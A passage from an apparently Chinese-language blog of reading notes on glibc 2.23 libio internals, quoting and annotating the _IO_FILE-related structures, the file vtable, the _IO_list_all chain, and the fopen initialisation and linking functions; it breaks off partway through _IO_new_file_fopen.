class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">wchar_t</span> *_IO_read_ptr;<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_read_end;<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_read_base;<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_write_base;<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_write_ptr;<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_write_end;<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_buf_base;<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_buf_end;<span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_save_base;<span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_backup_base;<span class="hljs-comment">/* Pointer to first valid character of</span><br><span class="hljs-comment">   backup area */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_save_end;<span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-type">__mbstate_t</span> _IO_state;<br>  <span class="hljs-type">__mbstate_t</span> _IO_last_state;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> _<span class="hljs-title">codecvt</span>;</span><br><br>  <span class="hljs-type">wchar_t</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *_<span class="hljs-title">wide_vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="IO-file-jumps"><a href="#IO-file-jumps" class="headerlink" title="_IO_file_jumps"></a>_IO_file_jumps</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_file_jumps</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_file_finish),<br>  JUMP_INIT(overflow, _IO_file_overflow),<br>  JUMP_INIT(underflow, _IO_file_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_default_pbackfail),<br>  JUMP_INIT(xsputn, _IO_file_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_new_file_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, _IO_new_file_sync),<br>  JUMP_INIT(doallocate, _IO_file_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中的宏定义如下，实际上就是各个函数的跳转表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">JUMP_INIT(dummy, <span class="hljs-number">0</span>), JUMP_INIT (dummy2, <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> JUMP_INIT(NAME,VALUE) VALUE</span><br></code></pre></td></tr></table></figure><h2 id="IO-list-all"><a href="#IO-list-all" class="headerlink" title="_IO_list_all"></a>_IO_list_all</h2><p>_IO_list_all-&gt;_IO_2_1_stderr_-&gt;_IO_2_1_stdout_-&gt;_IO_2_1_stdin_</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\stdfiles.c</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> *_<span class="hljs-title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;<br></code></pre></td></tr></table></figure><p>_IO_2_1_stderr_、_IO_2_1_stdout_和_IO_2_1_stdin_的定义其实在这（搜索的时候没找到）</p><blockquote><p>珍爱生命，远离宏定义</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\stdfiles.c</span><br><br>DEF_STDFILE(_IO_2_1_stdin_, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, _IO_NO_WRITES);<br>DEF_STDFILE(_IO_2_1_stdout_, <span class="hljs-number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);<br>DEF_STDFILE(_IO_2_1_stderr_, <span class="hljs-number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);<br></code></pre></td></tr></table></figure><p>第一层宏定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span><br><span class="hljs-meta">  static struct _IO_wide_data _IO_wide_data_##FD \</span><br><span class="hljs-meta">    = &#123; ._wide_vtable = &amp;_IO_wfile_jumps &#125;; \</span><br><span class="hljs-meta">  struct _IO_FILE_plus NAME \</span><br><span class="hljs-meta">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \</span><br><span class="hljs-meta">       &amp;_IO_file_jumps&#125;;</span><br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span><br><span class="hljs-meta">  struct _IO_FILE_plus NAME \</span><br><span class="hljs-meta">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, NULL), \</span><br><span class="hljs-meta">       &amp;_IO_file_jumps&#125;;</span><br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>第一层解宏定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stdin_</span> =</span> &#123;FILEBUF_LITERAL(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>), &amp;_IO_file_jumps&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stdout_</span> =</span> &#123;FILEBUF_LITERAL(&amp;_IO_2_1_stdin_, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>), &amp;_IO_file_jumps&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stderr_</span> =</span> &#123;FILEBUF_LITERAL(&amp;_IO_2_1_stdout_, <span class="hljs-number">4</span>+<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-literal">NULL</span>), &amp;_IO_file_jumps&#125;;<br></code></pre></td></tr></table></figure><p>第二层宏定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\libioP.h</span><br><br><span class="hljs-meta">#   <span class="hljs-keyword">define</span> FILEBUF_LITERAL(CHAIN, FLAGS, FD, WDP) \</span><br><span class="hljs-meta">       &#123; _IO_MAGIC+_IO_LINKED+_IO_IS_FILEBUF+FLAGS, \</span><br><span class="hljs-meta"> 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (_IO_FILE *) CHAIN, FD, \</span><br><span class="hljs-meta"> 0, _IO_pos_BAD, 0, 0, &#123; 0 &#125;, 0, _IO_pos_BAD, \</span><br><span class="hljs-meta"> 0 &#125;</span><br></code></pre></td></tr></table></figure><h2 id="IO-list-all-stamp"><a href="#IO-list-all-stamp" class="headerlink" title="_IO_list_all_stamp"></a>_IO_list_all_stamp</h2><p>记录_IO_list_all单链表更改的次数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-comment">/* Used to signal modifications to the list of FILE decriptors.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> _IO_list_all_stamp;<br></code></pre></td></tr></table></figure><h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><p>函数调用流程图：</p><img src="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/fopen.jpg" class title="fopen"><p>stdio.h中的fopen实际上是_IO_new_fopen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\include\stdio.h</span><br><br><span class="hljs-keyword">extern</span> _IO_FILE *_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*, <span class="hljs-type">const</span> <span class="hljs-type">char</span>*);<br><span class="hljs-meta">#   <span class="hljs-keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span><br></code></pre></td></tr></table></figure><p>或者iofopen.c中也有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofopen.c</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_new_fopen fopen</span><br></code></pre></td></tr></table></figure><p>_IO_new_fopen又调用了__fopen_internal</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofopen.c</span><br><br>_IO_FILE *<br>_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode)<br>&#123;<br>  <span class="hljs-keyword">return</span> __fopen_internal (filename, mode, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>__fopen_internal的流程如下：</p><ul><li>malloc分配内存</li><li>调用_IO_no_init null初始化结构体数据</li><li>设置vtable为_IO_file_jumps</li><li>将_IO_FILE结构体链入_IO_list_all</li><li>打开文件<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofopen.c</span><br><br>_IO_FILE *<br>__fopen_internal (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode, <span class="hljs-type">int</span> is32)<br>&#123;<br><span class="hljs-comment">//步骤一：为locked_FILE结构体new_f分配内容</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">locked_FILE</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> <span class="hljs-title">fp</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>    _IO_lock_t lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> <span class="hljs-title">wd</span>;</span><br>  &#125; *new_f = (<span class="hljs-keyword">struct</span> locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> locked_FILE));<br><br><span class="hljs-comment">//如果分配内存失败直接返回</span><br>  <span class="hljs-keyword">if</span> (new_f == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//步骤二：调用_IO_no_init初始化_IO_FILE</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//初始化(&amp;new_f-&gt;fp)-&gt;vtable为_IO_file_jumps</span><br><span class="hljs-comment">//#define _IO_JUMPS(THIS) (THIS)-&gt;vtable</span><br>  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<br><br><span class="hljs-comment">//步骤三：调用_IO_file_init将_IO_FILE_plus结构体链入_IO_list_all</span><br>  _IO_file_init (&amp;new_f-&gt;fp);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span><br>  new_f-&gt;fp.vtable = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//步骤四：调用_IO_file_fopen打开文件</span><br><span class="hljs-comment">//成功则调用__fopen_maybe_mmap，最终返回一个_IO_FILE结构体</span><br>  <span class="hljs-keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);<br><br><span class="hljs-comment">//如果失败则将_IO_FILE_plus从单链表中摘除，释放结构体并返回null</span><br>  _IO_un_link (&amp;new_f-&gt;fp);<br>  <span class="hljs-built_in">free</span> (new_f);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="IO-no-init"><a href="#IO-no-init" class="headerlink" title="_IO_no_init"></a>_IO_no_init</h2><p>调用了_IO_old_init，然后进行了一系列null初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_no_init (_IO_FILE *fp, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> orientation,<br>     <span class="hljs-keyword">struct</span> _IO_wide_data *wd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *jmp)<br>&#123;<br>  _IO_old_init (fp, flags);<br>  fp-&gt;_mode = orientation;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-keyword">if</span> (orientation &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;_wide_data = wd;<br>      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="hljs-literal">NULL</span>;<br><br>      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">/* Cause predictable crash when a wide function is called on a byte</span><br><span class="hljs-comment">       stream.  */</span><br>    fp-&gt;_wide_data = (<span class="hljs-keyword">struct</span> _IO_wide_data *) <span class="hljs-number">-1L</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  fp-&gt;_freeres_list = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-old-init"><a href="#IO-old-init" class="headerlink" title="_IO_old_init"></a>_IO_old_init</h3><p>也是一系列null初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_old_init (_IO_FILE *fp, <span class="hljs-type">int</span> flags)<br>&#123;<br>  fp-&gt;_flags = _IO_MAGIC|flags;<br>  fp-&gt;_flags2 = <span class="hljs-number">0</span>;<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_ptr = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_ptr = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_chain = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">/* Not necessary. */</span><br><br>  fp-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_backup_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_save_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_markers = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_cur_column = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_JUMPS_OFFSET</span><br>  fp-&gt;_vtable_offset = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_lock != <span class="hljs-literal">NULL</span>)<br>    _IO_lock_init (*fp-&gt;_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-file-init"><a href="#IO-file-init" class="headerlink" title="_IO_file_init"></a>_IO_file_init</h2><p>_IO_file_init也是一个宏，实际调用的函数是_IO_new_file_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_new_file_init _IO_file_init</span><br></code></pre></td></tr></table></figure><p>_IO_new_file_init进行了一些初始化并调用了_IO_link_in</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">void</span><br>_IO_new_file_init (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-comment">/* POSIX.1 allows another file handle to be used to change the position</span><br><span class="hljs-comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span><br><span class="hljs-comment">     position before we do the first fseek (and until a following fflush). */</span><br>  fp-&gt;file._offset = _IO_pos_BAD;<span class="hljs-comment">//其实就是-1</span><br>  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;<br><br>  _IO_link_in (fp);<br>  fp-&gt;file._fileno = <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLOSED_FILEBUF_FLAGS \</span><br><span class="hljs-meta">  (_IO_IS_FILEBUF+_IO_NO_READS+_IO_NO_WRITES+_IO_TIED_PUT_GET)</span><br><span class="hljs-comment">//0x2000+0x4+0x8+0x400</span><br></code></pre></td></tr></table></figure><h3 id="IO-link-in"><a href="#IO-link-in" class="headerlink" title="_IO_link_in"></a>_IO_link_in</h3><p>_IO_link_in将_IO_FILE_plus结构体链入_IO_list_all单链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_link_in (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br><span class="hljs-comment">//检查flag的标志位是否是_IO_LINKED</span><br>  <span class="hljs-keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-comment">//设置_IO_LINKED</span><br>      fp-&gt;file._flags |= _IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (_IO_FILE *) fp;<br>      _IO_flockfile ((_IO_FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//将结构体链入_IO_list_all，递增_IO_list_all_stamp</span><br>      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;<br>      _IO_list_all = fp;<br>      ++_IO_list_all_stamp;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((_IO_FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-file-fopen"><a href="#IO-file-fopen" class="headerlink" title="_IO_file_fopen"></a>_IO_file_fopen</h2><p>这其实也是个宏定义，实际上调用的函数是_IO_new_file_fopen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_new_file_fopen _IO_file_fopen</span><br></code></pre></td></tr></table></figure><p>_IO_new_file_fopen的过程如下：</p><ul><li><p>_IO_file_is_open((fp)-&gt;_fileno !&#x3D; 